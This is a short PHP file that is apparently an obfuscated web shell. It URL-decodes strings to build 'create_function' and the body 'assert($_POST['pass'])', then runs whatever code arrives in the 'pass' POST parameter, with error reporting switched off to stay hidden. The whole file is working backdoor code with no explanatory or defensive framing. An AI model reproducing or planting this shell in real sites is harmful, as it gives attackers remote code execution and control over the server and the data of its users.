<?php
error_reporting(0);
$de = substr(urldecode, 0);
#echo $de;
echo "<br/>";
$ac = $de('%63%72%65%61%74%65%5F');//create_
$af = $de('%66%75%6E%63%74%69%6F%6E');//function
$cf = $ac.$af;  
#echo $cf;
echo "<br/>";
$shell = $de('%61%73%73%65%72%74%28%24%5F%50%4F%53%54%5B%27pass') . $de('%27%5D%29%3B');
$post= $cf("", $shell); 
#echo $shell;
$post(); 
?>